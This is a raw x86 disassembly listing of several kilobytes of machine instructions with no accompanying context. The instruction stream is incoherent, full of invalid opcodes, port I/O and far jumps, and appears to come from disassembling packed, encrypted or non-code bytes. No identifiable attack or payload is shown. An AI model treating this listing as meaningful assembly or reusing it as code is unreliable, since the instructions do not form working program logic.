  411785:	sbb    cl,BYTE PTR [ebp-0x587e9199]
  41178b:	mov    eax,ds:0xbf6db59
  411790:	mov    edi,0xb01cca48
  411795:	punpckhdq mm4,QWORD PTR [ebp-0x21]
  411799:	sub    edi,ecx
  41179b:	les    eax,FWORD PTR [esp+ecx*8]
  41179e:	jo     0x4117f1
  4117a0:	lods   al,BYTE PTR ds:[esi]
  4117a1:	shl    BYTE PTR [ebp-0x70d9d83a],0xf5
  4117a8:	add    al,BYTE PTR [ecx]
  4117aa:	leave  
  4117ab:	cmp    ebx,DWORD PTR [ebp+0x49]
  4117ae:	push   ds
  4117af:	xchg   ebx,eax
  4117b0:	pop    ebx
  4117b1:	adc    DWORD PTR [edi],ebx
  4117b3:	pop    esp
  4117b4:	xchg   esi,eax
  4117b5:	rcr    ah,cl
  4117b7:	dec    esi
  4117b8:	ins    DWORD PTR es:[edi],dx
  4117b9:	mov    al,ds:0xf481d884
  4117be:	enter  0x1ee1,0xe9
  4117c2:	xor    eax,0xd1ac0be
  4117c7:	push   ss
  4117c8:	push   esi
  4117c9:	xor    ah,dh
  4117cb:	jle    0x411797
  4117cd:	out    dx,eax
  4117ce:	sub    al,0x9e
  4117d0:	xchg   ecx,eax
  4117d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117d2:	ins    BYTE PTR es:[edi],dx
  4117d3:	mov    cl,0x30
  4117d5:	xchg   eax,edx
  4117d7:	or     ebx,DWORD PTR [ebp-0x7d]
  4117da:	outs   dx,BYTE PTR ds:[esi]
  4117db:	dec    ebp
  4117dc:	add    eax,0xf64eeba2
  4117e1:	aaa    
  4117e2:	mov    al,0xe1
  4117e4:	xchg   ebp,eax
  4117e5:	jo     0x41177e
  4117e7:	scas   al,BYTE PTR es:[edi]
  4117e8:	ret    0x3115
  4117eb:	mov    cl,0x28
  4117ed:	aas    
  4117ee:	jbe    0x4117fa
  4117f0:	test   al,0x63
  4117f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117f3:	sub    eax,0xb125eeae
  4117f8:	and    ebx,esp
  4117fa:	fst    DWORD PTR [edx*1-0x6544582f]
  411801:	and    BYTE PTR [esi-0x5d],0xda
  411805:	outs   dx,DWORD PTR ds:[esi]
  411806:	mov    al,0x85
  411808:	enter  0xc14b,0xdd
  41180c:	popa   
  41180d:	xor    DWORD PTR [ebp-0x30],ecx
  411810:	stos   DWORD PTR es:[edi],eax
  411811:	mov    bh,0x71
  411813:	xchg   dh,al
  411815:	lock adc eax,0x54ccd749
  41181b:	mov    eax,0x5e797afb
  411820:	sti    
  411821:	push   esi
  411822:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411823:	lods   al,BYTE PTR ds:[esi]
  411824:	cmp    eax,0x86db56f5
  411829:	in     al,dx
  41182a:	or     BYTE PTR [edi-0x1c],dl
  41182d:	push   ecx
  41182e:	out    0x88,eax
  411830:	dec    edi
  411831:	repz xor DWORD PTR [eax-0x6f830737],edx
  411838:	mov    esp,DWORD PTR [edx-0x7e]
  41183b:	push   esp
  41183c:	stc    
  41183d:	sbb    al,0x5b
  41183f:	xchg   ebp,eax
  411840:	xor    cl,BYTE PTR [edx]
  411842:	and    al,0x6b
  411844:	cld    
  411845:	sbb    BYTE PTR [ebx],0xc4
  411848:	push   ds
  411849:	push   ebp
  41184a:	mov    al,0x73
  41184c:	or     eax,0xae12d021
  411851:	lods   eax,DWORD PTR ds:[esi]
  411852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411853:	mov    ds:0x233b80d1,eax
  411858:	ret    
  411859:	xchg   ebx,eax
  41185a:	dec    ecx
  41185b:	popf   
  41185c:	enter  0xd3ed,0x9
  411860:	mov    al,ds:0x5b5b4be9
  411865:	in     eax,0xa0
  411867:	jo     0x411867
  411869:	cli    
  41186a:	retf   
  41186b:	jp     0x411839
  41186d:	jne    0x4117f0
  41186f:	arpl   WORD PTR [ebp+0x4a],si
  411872:	adc    bl,bl
  411874:	adc    eax,0x679a63b4
  411879:	jmp    0x4118f6
  41187b:	imul   edi,eax,0xd23238ab
  411881:	cmp    ecx,DWORD PTR ds:0xbad9706a
  411887:	popa   
  411888:	sbb    BYTE PTR ds:0x30e90e74,0xf6
  41188f:	repnz fcmovnu st,st(1)
  411892:	fcom   QWORD PTR [edi]
  411894:	pushf  
  411895:	mov    ax,0xae02
  411899:	dec    edi
  41189a:	scas   al,BYTE PTR es:[edi]
  41189b:	xor    edx,DWORD PTR [esi+0x5f]
  41189e:	push   ebx
  41189f:	loopne 0x41191d
  4118a1:	clc    
  4118a2:	mov    dl,BYTE PTR ds:0xf0f42e8
  4118a8:	jmp    0x411902
  4118aa:	arpl   WORD PTR [eax+0x2a780f50],dx
  4118b0:	and    eax,0xc17e231a
  4118b5:	addr16 pop esp
  4118b7:	cdq    
  4118b8:	pop    ss
  4118b9:	lods   eax,DWORD PTR ds:[esi]
  4118ba:	cmp    eax,ecx
  4118bc:	repnz sub ecx,DWORD PTR [eax]
  4118bf:	arpl   WORD PTR [edi+0x328da367],si
  4118c5:	cmp    al,0x31
  4118c7:	lds    ebx,FWORD PTR [ebp-0x49]
  4118ca:	sbb    edx,DWORD PTR [esi]
  4118cc:	(bad)  
  4118cd:	jno    0x411922
  4118cf:	mov    WORD PTR [ebp-0x20],?
  4118d2:	push   ss
  4118d3:	fidiv  DWORD PTR [ebx]
  4118d5:	cmp    bh,BYTE PTR [ecx-0x63360429]
  4118db:	cs (bad) 
  4118dd:	lea    edi,[ebx-0x7c0f0c9]
  4118e3:	adc    BYTE PTR [ecx-0xeb8aed7],0x3e
  4118ea:	dec    ebp
  4118eb:	sbb    DWORD PTR [ebx+0x50],eax
  4118ee:	mov    edi,0x57dcb46
  4118f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118f4:	cld    
  4118f5:	arpl   WORD PTR [edx-0x45],di
  4118f8:	sub    bl,ch
  4118fa:	outs   dx,DWORD PTR ds:[esi]
  4118fb:	xor    al,0xe1
  4118fd:	(bad)  [edx]
  4118ff:	push   esi
  411900:	lahf   
  411901:	push   0x20
  411903:	add    bl,BYTE PTR [esi]
  411905:	das    
  411906:	sbb    DWORD PTR [ebx-0x7c],eax
  411909:	aam    0x38
  41190b:	sub    esp,eax
  41190d:	sbb    al,0xc2
  41190f:	mov    edx,0x921683ea
  411914:	and    ecx,DWORD PTR [ebp+0x31]
  411917:	ret    
  411918:	fs sti 
  41191a:	out    dx,al
  41191b:	popf   
  41191c:	popf   
  41191d:	push   edx
  41191e:	inc    esi
  41191f:	aaa    
  411920:	mov    BYTE PTR ds:0x5ae161c9,cl
  411926:	xor    DWORD PTR [ecx],ecx
  411928:	mov    ah,0xb7
  41192a:	retf   0xed08
  41192d:	xchg   edi,eax
  41192f:	in     eax,0x15
  411931:	ins    DWORD PTR es:[edi],dx
  411932:	cli    
  411933:	xor    eax,0x25d90ddb
  411938:	push   edx
  411939:	ret    
  41193a:	cmp    ah,dh
  41193c:	aad    0x1f
  41193e:	mov    ds:0x6c9cf081,eax
  411943:	mov    dh,0x78
  411945:	dec    edx
  411946:	jp     0x411985
  411948:	inc    ebp
  411949:	dec    eax
  41194a:	mov    ecx,0x683fe8ee
  41194f:	stc    
  411950:	push   ss
  411951:	dec    ebp
  411952:	mov    eax,ds:0xb290a9fd
  411957:	lahf   
  411958:	xchg   DWORD PTR [ecx+edi*2-0xe6b12b],ecx
  41195f:	mov    ecx,0xd2b168e6
  411964:	leave  
  411965:	das    
  411966:	and    al,0xdd
  411968:	adc    DWORD PTR [eax-0x4f60acca],0xffffffdd
  41196f:	xchg   DWORD PTR [edi+0x57],eax
  411972:	test   eax,0xb36f4246
  411977:	jle    0x4119a4
  411979:	pop    edi
  41197a:	mov    ds:0x32b134fb,eax
  41197f:	aad    0x72
  411981:	mov    al,ds:0x16bb56e5
  411986:	fild   DWORD PTR [esi+0x7cfe54fa]
  41198c:	(bad)  
  41198d:	push   eax
  41198e:	mov    eax,0xbc7b3e99
  411993:	sbb    eax,0x540bea89
  411998:	call   0x4848:0xef5ee5e6
  41199f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119a0:	inc    edx
  4119a1:	cdq    
  4119a2:	ret    
  4119a3:	cdq    
  4119a4:	add    eax,0x23050d58
  4119a9:	pop    esi
  4119aa:	fadd   DWORD PTR ds:[edx]
  4119ad:	inc    esp
  4119ae:	pop    es
  4119af:	rcl    DWORD PTR [edx],1
  4119b1:	in     al,0x32
  4119b3:	lahf   
  4119b4:	mov    edx,0xdc54a95
  4119b9:	sub    DWORD PTR [ebx+esi*2+0x2d],0xade68257
  4119c1:	lods   al,BYTE PTR ds:[esi]
  4119c2:	mov    ebp,0x43a1eed0
  4119c7:	fcom   QWORD PTR [ecx-0x217ea689]
  4119cd:	mov    ebx,ebp
  4119cf:	out    dx,al
  4119d0:	cdq    
  4119d1:	xchg   ecx,eax
  4119d2:	in     al,dx
  4119d3:	repz ror DWORD PTR [ecx],1
  4119d6:	lea    ecx,[ecx+0x7d]
  4119d9:	push   ecx
  4119da:	int3   
  4119db:	(bad)  
  4119dc:	mov    ah,0x53
  4119de:	inc    esp
  4119df:	or     BYTE PTR [esi+ebp*8-0x3c2828bb],dl
  4119e6:	or     dh,bh
  4119e8:	inc    edi
  4119e9:	cld    
  4119ea:	rcl    DWORD PTR [edi],1
  4119ec:	(bad)  
  4119ed:	mov    eax,ds:0x633d7f25
  4119f2:	idiv   BYTE PTR [eax-0x31]
  4119f5:	and    eax,0x7036b07d
  4119fa:	push   0x398f9148
  4119ff:	repz mov ds:0xc4c4ed9b,eax
  411a05:	mov    edi,0xc4b80b54
  411a0a:	push   edi
  411a0b:	pop    esp
  411a0c:	jmp    0x31c5:0xd2eba333
  411a13:	or     eax,0xadb69f46
  411a18:	std    
  411a19:	pop    ds
  411a1a:	ds inc ecx
  411a1c:	out    0x7d,al
  411a1e:	jns    0x4119af
  411a20:	out    dx,al
  411a21:	inc    edx
  411a22:	adc    BYTE PTR [eax],bl
  411a24:	iret   
  411a25:	xchg   edx,eax
  411a26:	or     DWORD PTR [esi-0x12],ecx
  411a29:	dec    edi
  411a2a:	dec    edi
  411a2b:	into   
  411a2c:	clc    
  411a2d:	adc    BYTE PTR [ebx-0x4],ch
  411a30:	mov    ecx,0x4bb6c1be
  411a35:	dec    esp
  411a36:	outs   dx,BYTE PTR ds:[esi]
  411a37:	fisttp DWORD PTR [edx]
  411a39:	scas   eax,DWORD PTR es:[edi]
  411a3a:	push   edx
  411a3b:	pop    edi
  411a3c:	test   al,0xea
  411a3e:	in     al,0x68
  411a40:	push   edi
  411a41:	jno    0x411a4c
  411a43:	out    0xbe,al
  411a45:	sar    esi,1
  411a47:	push   esi
  411a48:	push   esp
  411a49:	dec    eax
  411a4a:	cvtpi2ps xmm0,QWORD PTR [ebp+0x55c08aa4]
  411a51:	push   0x60
  411a53:	mov    eax,0x3b200ac1
  411a58:	xlat   BYTE PTR ds:[ebx]
  411a59:	cmp    ah,BYTE PTR [eax-0x44]
  411a5c:	out    0xa,eax
  411a5e:	pop    es
  411a5f:	in     al,dx
  411a60:	fbstp  TBYTE PTR [esi+0x19f56774]
  411a66:	outs   dx,DWORD PTR ds:[esi]
  411a67:	scas   eax,DWORD PTR es:[edi]
  411a68:	hlt    
  411a69:	ror    DWORD PTR [esp+ebp*4+0x19931fb2],1
  411a70:	mov    WORD PTR [esi],fs
  411a72:	mov    cl,0x1a
  411a74:	xor    eax,0xb0f3ca77
  411a79:	fcom   DWORD PTR [edx+0x5babd6b0]
  411a7f:	daa    
  411a80:	sub    al,0x88
  411a82:	jbe    0x411a3a
  411a84:	xchg   ebp,eax
  411a85:	inc    edx
  411a86:	jns    0x411a34
  411a88:	icebp  
  411a89:	jb     0x411a92
  411a8b:	pop    ds
  411a8c:	jb     0x411aed
  411a8e:	cld    
  411a8f:	dec    edi
  411a90:	or     BYTE PTR [eax],al
  411a92:	dec    eax
  411a93:	jl     0x411a3e
  411a95:	iret   
  411a96:	dec    edi
  411a97:	jne    0x411aa0
  411a99:	dec    ecx
  411a9a:	push   ebp
  411a9b:	xor    al,0xfb
  411a9d:	cwde   
  411a9e:	(bad)  
  411aa0:	lods   al,BYTE PTR ds:[esi]
  411aa1:	enter  0x2bb9,0x3b
  411aa5:	xchg   ecx,eax
  411aa6:	mov    ?,WORD PTR [eax]
  411aa8:	call   0x6eaa11d8
  411aad:	xor    ebx,DWORD PTR [ebx+0x46]
  411ab0:	pushf  
  411ab1:	jbe    0x411a7a
  411ab3:	mul    BYTE PTR [edx]
  411ab5:	stos   BYTE PTR es:[edi],al
  411ab6:	and    cl,BYTE PTR [ebp+0xb5c96f0]
  411abc:	rcl    BYTE PTR [edi+0x3a],cl
  411abf:	cmp    DWORD PTR [esi+eax*4-0x32],esp
  411ac3:	retf   
  411ac4:	outs   dx,DWORD PTR ds:[esi]
  411ac5:	add    BYTE PTR [esi],0x9d
  411ac8:	xchg   edx,eax
  411ac9:	lahf   
  411aca:	loop   0x411a69
  411acc:	(bad)  
  411ace:	arpl   WORD PTR [eax+0x71],ax
  411ad1:	addr16 jno 0x411b12
  411ad4:	xlat   BYTE PTR ds:[ebx]
  411ad5:	xlat   BYTE PTR ds:[ebx]
  411ad6:	inc    esi
  411ad7:	xchg   edi,eax
  411ad8:	in     eax,dx
  411ad9:	mov    DWORD PTR ds:0xde4d3a45,ecx
  411adf:	mov    DWORD PTR [eax+0x2065fd4],edx
  411ae5:	mov    DWORD PTR [eax],eax
  411ae7:	cmp    BYTE PTR [ebx],cl
  411ae9:	xor    cl,0x65
  411aec:	out    dx,al
  411aed:	xlat   BYTE PTR ds:[ebx]
  411aee:	cmp    bl,BYTE PTR [esi+0x3b]
  411af1:	(bad)  
  411af2:	jle    0x411aff
  411af4:	das    
  411af5:	out    0xd,al
  411af7:	jl     0x411b3e
  411af9:	dec    esp
  411afa:	pop    ecx
  411afb:	(bad)  
  411afc:	push   edi
  411afd:	push   ebx
  411afe:	daa    
  411aff:	bound  ebp,QWORD PTR [eax-0x37]
  411b02:	mov    WORD PTR [esi-0x1c1136df],es
  411b08:	add    eax,0x8edb05bb
  411b0d:	push   ecx
  411b0e:	ror    DWORD PTR [edi],1
  411b10:	out    0x9c,al
  411b12:	fisttp WORD PTR [ecx]
  411b14:	mov    cl,0x90
  411b16:	xchg   esp,eax
  411b17:	(bad)  
  411b18:	fiadd  WORD PTR [esi-0x4725ef0]
  411b1e:	adc    DWORD PTR [edi+0x39bdf142],edi
  411b24:	dec    eax
  411b25:	adc    BYTE PTR [ecx+0x8],dh
  411b28:	or     bl,bl
  411b2a:	mov    ebx,0xbd7b666b
  411b2f:	out    dx,al
  411b30:	mov    esp,0xfe4915f7
  411b35:	mov    ebx,esp
  411b37:	adc    al,BYTE PTR [ebx]
  411b39:	sbb    esi,ebp
  411b3b:	push   0x11
  411b3d:	shr    BYTE PTR [ebx-0x59],cl
  411b40:	mov    ecx,0x18a4a0e1
  411b45:	out    0x6f,eax
  411b47:	enter  0xd458,0xc3
  411b4b:	xchg   esi,eax
  411b4c:	mov    esp,0xa915bb36
  411b51:	(bad)  
  411b52:	out    dx,al
  411b53:	push   esi
  411b54:	push   esi
  411b55:	adc    eax,DWORD PTR [esi-0x7f]
  411b58:	sbb    eax,0xd7fea8bc
  411b5d:	mov    WORD PTR ds:0x5bcbb83e,?
  411b63:	out    0x97,al
  411b65:	hlt    
  411b66:	into   
  411b67:	adc    esp,DWORD PTR [ebp-0x36261197]
  411b6d:	imul   DWORD PTR [eax+0x2a]
  411b70:	pop    ebp
  411b71:	lock cli 
  411b73:	mov    al,ds:0x7c06224c
  411b78:	pop    ds
  411b79:	mov    cl,BYTE PTR [eax+0x4ce4fb0]
  411b7f:	push   edi
  411b80:	xlat   BYTE PTR ds:[ebx]
  411b81:	inc    ebp
  411b82:	out    0x22,al
  411b84:	aaa    
  411b85:	or     DWORD PTR [esi],ebp
  411b87:	mov    al,ds:0x7c0fd652
  411b8c:	jmp    0x9fe7:0x28348e58
  411b93:	ds mov esi,0x3a432d63
  411b99:	retf   0xc86b
  411b9c:	dec    ecx
  411b9d:	mov    ecx,gs
  411b9f:	shr    DWORD PTR [ebx],1
  411ba1:	mov    esp,0x56f2160a
  411ba6:	ins    DWORD PTR es:[edi],dx
  411ba7:	or     ecx,edx
  411ba9:	stos   DWORD PTR es:[edi],eax
  411baa:	mov    ds:0x1e8cbba3,eax
  411baf:	pop    es
  411bb0:	mov    al,0xf1
  411bb2:	sar    DWORD PTR [ebx+0x7],cl
  411bb5:	leave  
  411bb6:	add    bl,al
  411bb8:	mov    al,0x17
  411bba:	cmp    al,0xe1
  411bbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bbd:	dec    edi
  411bbe:	push   ds
  411bbf:	xor    ebp,ebp
  411bc1:	dec    esi
  411bc2:	xor    ebx,0x5f71571a
  411bc8:	es jle 0x411c3f
  411bcb:	int    0x22
  411bcd:	js     0x411bbd
  411bcf:	fidiv  WORD PTR [eax]
  411bd1:	cmp    ch,BYTE PTR [esi-0x36]
  411bd4:	dec    edx
  411bd5:	stc    
  411bd6:	rol    DWORD PTR [esi+edx*8],cl
  411bd9:	mov    ds:0xfea1e6b1,eax
  411bde:	int    0xae
  411be0:	mov    WORD PTR [edx+0x6873e8a3],?
  411be6:	fs scas al,BYTE PTR es:[edi]
  411be8:	(bad)  
  411be9:	jle    0x411bfd
  411beb:	mov    ecx,0x69f4d512
  411bf0:	mov    esi,0xa5b864eb
  411bf5:	dec    eax
  411bf6:	mov    dl,0xda
  411bf8:	adc    DWORD PTR [edx+ebp*8-0x4f],esi
  411bfc:	rol    BYTE PTR [ebp+0x18],cl
  411bff:	mov    eax,DWORD PTR [ebx+0x52]
  411c02:	pop    esp
  411c03:	xlat   BYTE PTR ds:[ebx]
  411c04:	pop    edi
  411c05:	or     al,0x96
  411c07:	push   es
  411c08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c09:	pop    ecx
  411c0a:	sbb    esi,0xffffffb7
  411c0d:	lahf   
  411c0e:	ds div dl
  411c11:	pop    ecx
  411c12:	xchg   edx,eax
  411c13:	ds xor eax,0xa22a3af1
  411c19:	push   esi
  411c1a:	xchg   ebx,eax
  411c1b:	int    0xef
  411c1d:	leave  
  411c1e:	popa   
  411c1f:	pop    ecx
  411c20:	lods   al,BYTE PTR ds:[esi]
  411c21:	dec    edx
  411c22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c23:	cmc    
  411c24:	cli    
  411c25:	test   eax,0x6ffd398a
  411c2a:	sbb    al,BYTE PTR [esi+ebp*4-0x20]
  411c2e:	and    BYTE PTR es:[esi+0x7808de17],0x1f
  411c36:	loopne 0x411bd3
  411c38:	aas    
  411c39:	fld    DWORD PTR [esi+0x2029486e]
  411c3f:	(bad)  
  411c40:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c42:	push   ebp
  411c43:	mov    edx,0xd2d902f3
  411c48:	jle    0x411bd3
  411c4a:	sub    bl,dl
  411c4c:	pop    ds
  411c4d:	adc    ebx,DWORD PTR [eax-0x1d]
  411c50:	dec    ebx
  411c51:	add    eax,0x730e0048
  411c56:	mov    ds:0x1642072c,al
  411c5b:	ret    
  411c5c:	test   BYTE PTR [esi],ah
  411c5e:	call   0x1c89:0x6135324e
  411c65:	push   edx
  411c66:	pushf  
  411c67:	xchg   ebp,eax
  411c68:	test   BYTE PTR [eax],al
  411c6a:	mov    BYTE PTR ds:0xf3ad2437,dh
  411c70:	or     BYTE PTR [edx],dh
  411c72:	addr16 das 
  411c74:	ins    DWORD PTR es:[edi],dx
  411c75:	cmp    DWORD PTR ds:0xabeb3feb,edi
  411c7b:	js     0x411cd1
  411c7d:	pop    edx
  411c7e:	scas   al,BYTE PTR es:[edi]
  411c7f:	sbb    al,0x88
  411c81:	(bad)  
  411c82:	iret   
  411c83:	into   
  411c84:	xchg   edi,eax
  411c85:	push   ds
  411c86:	jmp    0xfc9d:0xcd258205
  411c8d:	imul   esi,edx,0xffffffbf
  411c90:	push   cs
  411c91:	test   eax,0x89c00310
  411c96:	mov    esp,0x0
	...
  411d13:	add    BYTE PTR [ecx],ch
  411d15:	pop    edx
  411d16:	inc    ecx
  411d17:	sbb    dh,BYTE PTR [ebx+0x1b]
  411d1a:	jnp    0x411d97
  411d1c:	retf   0x5bc8
  411d1f:	nop
  411d20:	push   0x98956fad
  411d25:	mov    BYTE PTR [eax],0x0
  411d28:	imul   eax,DWORD PTR [edi],0x0
  411d2b:	add    BYTE PTR [edx],cl
  411d2d:	pop    eax
  411d2e:	int    0x3
  411d30:	(bad)  
  411d31:	jmp    0x920c:0xb7dfd273
  411d38:	xchg   edi,eax
  411d39:	jnp    0x411ce1
  411d3b:	cli    
  411d3c:	xor    al,0x12
  411d3e:	fwait
  411d3f:	in     al,dx
  411d40:	jns    0x411d98
  411d42:	pushf  
  411d43:	push   es
  411d44:	adc    DWORD PTR ds:0xf1f85dd0,edi
  411d4a:	(bad)  
  411d4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d4c:	push   0x6
  411d4e:	cmp    eax,0xfa9e6233
  411d53:	mov    eax,0xb1b23c4
  411d58:	cmp    ah,al
  411d5a:	sbb    BYTE PTR [edi-0x19],ch
  411d5d:	pop    esi
  411d5e:	cmp    BYTE PTR [esi-0x4c],al
  411d61:	pop    ss
  411d62:	repnz xchg esp,eax
  411d64:	div    DWORD PTR [edx+0x434dabc7]
  411d6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d6b:	fisubr DWORD PTR [eax+0x435abd07]
  411d71:	pop    ds
  411d72:	iret   
  411d73:	out    dx,al
  411d74:	leave  
  411d75:	shl    ebx,0x27
  411d78:	dec    ecx
  411d79:	sub    al,0x4a
  411d7b:	int3   
  411d7c:	mov    eax,ds:0x15270c25
  411d81:	and    bh,0x8c
  411d84:	xor    ch,BYTE PTR [ebx-0x56]
  411d87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d88:	aad    0xef
  411d8a:	and    al,0x46
  411d8c:	inc    ecx
  411d8d:	data16 mov al,0xa5
  411d91:	cmp    eax,0xe96aeaf
  411d96:	xor    ebp,DWORD PTR [esp+edi*1+0x328cd736]
  411d9d:	nop
  411d9e:	sub    al,0x3b
  411da0:	dec    esp
  411da1:	jg     0x411d9a
  411da3:	cmc    
  411da4:	add    eax,ebx
  411da6:	pop    ds
  411da7:	fdiv   DWORD PTR [ebx]
  411da9:	test   al,0xa3
  411dab:	pusha  
  411dac:	jl     0x411def
  411dae:	push   ebx
  411daf:	mov    WORD PTR [edi+0x6f8c8d6f],?
  411db5:	test   bh,bh
  411db7:	dec    edi
  411db8:	pop    esi
  411db9:	mov    al,0xba
  411dbb:	adc    al,0xbf
  411dbd:	and    eax,eax
  411dbf:	adc    al,0xbb
  411dc1:	inc    eax
  411dc2:	xor    eax,0x24d1c56a
  411dc7:	or     eax,0x8814a588
  411dcc:	add    al,0xb9
  411dce:	popa   
  411dcf:	mov    ds:0x63e37fc4,eax
  411dd4:	in     al,0xdc
  411dd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dd7:	addr16 and eax,0xf6c5b04b
  411ddd:	iret   
  411dde:	dec    ebx
  411ddf:	add    al,0x91
  411de1:	imul   edi,DWORD PTR [ebx+0x50],0xefff8a2c
  411de8:	or     BYTE PTR [edx-0x46],0xc4
  411dec:	push   ecx
  411ded:	mov    ah,0xf5
  411def:	aad    0x42
  411df1:	ss jo  0x411df2
  411df4:	mov    eax,ds:0x7da3385
  411df9:	sar    BYTE PTR ds:0x6890c12c,1
  411dff:	in     al,dx
  411e00:	xor    DWORD PTR [edx-0x18ad3271],edi
  411e06:	add    eax,0xf2c327a5
  411e0b:	xchg   edi,eax
  411e0c:	nop
  411e0d:	xchg   edx,eax
  411e0e:	je     0x411e1a
  411e10:	hlt    
  411e11:	shr    BYTE PTR [eax+0x4d],1
  411e14:	jo     0x411e89
  411e16:	mov    ah,BYTE PTR [edi]
  411e18:	cwde   
  411e19:	push   ebx
  411e1a:	jnp    0x411e83
  411e1c:	add    BYTE PTR [esi],cl
  411e1e:	mov    dl,0x99
  411e20:	(bad)
  411e23:	jns    0x411e43
  411e25:	jb     0x411e69
  411e27:	adc    al,0x14
  411e29:	or     cl,BYTE PTR [edx+0x27]
  411e2c:	dec    eax
  411e2d:	fadd   DWORD PTR [ecx]
  411e2f:	cli    
  411e30:	push   eax
  411e31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e32:	mov    dl,0xc1
  411e34:	mov    ebx,0x2f7eaee3
  411e39:	jmp    0xfdf1:0x273e7c19
  411e40:	fnstcw WORD PTR [esi]
  411e42:	xchg   ecx,eax
  411e43:	iret   
  411e44:	or     BYTE PTR [ecx],0xf4
  411e47:	adc    edx,DWORD PTR [ecx+0x3f]
  411e4a:	outs   dx,BYTE PTR ds:[esi]
  411e4b:	pop    edx
  411e4c:	popa   
  411e4d:	loop   0x411eb7
  411e4f:	sbb    ch,BYTE PTR ds:0xbd04b476
  411e55:	fmul   DWORD PTR [ecx]
  411e57:	mov    BYTE PTR [esi],0x5
  411e5a:	cwde   
  411e5b:	push   edi
  411e5c:	sbb    esp,DWORD PTR [eax]
  411e5e:	jmp    0xedaa4459
  411e63:	mov    eax,0x5105f1b1
  411e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e69:	js     0x411eb2
  411e6b:	sub    eax,0x74055b17
  411e70:	fcomp  st(7)
  411e72:	cmc    
  411e73:	push   ds
  411e74:	cmovge ecx,DWORD PTR [ebp-0x1cf2af90]
  411e7b:	adc    BYTE PTR [edi*1+0x6a9db340],dh
  411e82:	lods   al,BYTE PTR ds:[esi]
  411e83:	or     dl,BYTE PTR [ecx]
  411e85:	out    dx,al
  411e86:	dec    edi
  411e87:	(bad)  
  411e88:	mov    edx,0x86687716
  411e8d:	sub    ebp,ebx
  411e8f:	fdivrp st(7),st
  411e91:	out    0x62,al
  411e93:	sub    eax,0x82f09483
  411e98:	push   edi
  411e99:	(bad)  
  411e9a:	sub    eax,0x9d58bdb9
  411e9f:	mov    WORD PTR [ecx+0x3f652e12],?
  411ea5:	lea    ebp,[esi+ebp*4+0x31]
  411ea9:	mov    ds:0xbd2fc467,eax
  411eae:	setbe  BYTE PTR [ebx]
  411eb1:	jp     0x411f23
  411eb3:	and    edx,0xe4165df1
  411eb9:	cwde   
  411eba:	nop
  411ebb:	fiadd  WORD PTR [esi-0x6be34c34]
  411ec1:	in     al,0x7a
  411ec3:	mov    ds:0x14e2df1,eax
  411ec8:	pop    ecx
  411ec9:	xchg   esi,eax
  411eca:	and    eax,0x7b05830a
  411ecf:	xchg   BYTE PTR [esp+esi*4+0x7c],al
  411ed3:	cmp    esi,edx
  411ed5:	cli    
  411ed6:	cmp    eax,0x107e0555
  411edb:	pop    ebp
  411edc:	test   DWORD PTR [esi-0x3c],ecx
  411edf:	add    esi,DWORD PTR [ebx+0x5abe7a33]
  411ee5:	push   eax
  411ee6:	pushf  
  411ee7:	push   esp
  411ee8:	ja     0x411f35
  411eea:	ret    0x8ec4
  411eed:	sbb    al,0x7b
  411eef:	cli    
  411ef0:	push   cs
  411ef1:	jl     0x411f0b
  411ef3:	dec    esp
  411ef4:	dec    esi
  411ef5:	adc    bl,cl
  411ef7:	in     eax,0x51
  411ef9:	in     al,0xda
  411efb:	mov    ds:0xf41284c4,al
  411f00:	xchg   DWORD PTR [esi+0x1f],ebx
  411f03:	adc    al,0x5a
  411f05:	push   ecx
  411f06:	sub    BYTE PTR [edi-0x7eaf0080],dl
  411f0c:	popa   
  411f0d:	or     bh,BYTE PTR [ebp+0x4b]
  411f10:	push   es
  411f11:	xchg   DWORD PTR [esi+0x2c],eax
  411f14:	mov    edi,0x560fdf18
  411f19:	test   esp,edx
  411f1b:	xchg   BYTE PTR [ebp-0x60],cl
  411f1e:	addr16 dec ebp
  411f20:	scas   eax,DWORD PTR es:[edi]
  411f21:	or     ecx,DWORD PTR [ecx]
  411f23:	out    0xc6,eax
  411f25:	inc    esi
  411f26:	xor    eax,0x6bae9fcc
  411f2b:	dec    ecx
  411f2c:	and    al,0x8e
  411f2e:	fsub   QWORD PTR [edx]
  411f30:	push   es
  411f31:	adc    BYTE PTR [edi-0x5080fbe2],ah
  411f37:	xchg   edi,eax
  411f38:	inc    esi
  411f39:	mov    dl,0xd4
  411f3b:	xchg   edi,eax
  411f3c:	xor    DWORD PTR [ebx],0xb85c06a7
  411f42:	jp     0x411f5e
  411f44:	mov    dh,0xf4
  411f46:	fsubr  DWORD PTR [esi+0xe]
  411f49:	sbb    DWORD PTR [esp+edx*1+0x1c772933],0xa0b28575
  411f54:	gs pop edx
  411f56:	lods   eax,DWORD PTR ds:[esi]
  411f57:	lods   al,BYTE PTR ds:[esi]
  411f58:	lods   al,BYTE PTR ds:[esi]
  411f59:	inc    ebp
  411f5a:	pop    ebx
  411f5b:	in     eax,0x58
  411f5d:	je     0x411f87
  411f5f:	out    dx,eax
  411f60:	dec    BYTE PTR [edi]
  411f62:	pop    ecx
  411f63:	mov    ds:0xd00f1f78,al
  411f68:	mov    esp,0x8b5163ac
  411f6d:	mov    ah,0x32
  411f6f:	bound  edx,QWORD PTR [esi-0x65bb346f]
  411f75:	fidivr DWORD PTR [ebp-0x5b]
  411f78:	xchg   ebx,eax
  411f79:	rcr    BYTE PTR ds:0xa5ca7d04,0x35
  411f80:	jecxz  0x411ff2
  411f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f83:	mov    dl,0x65
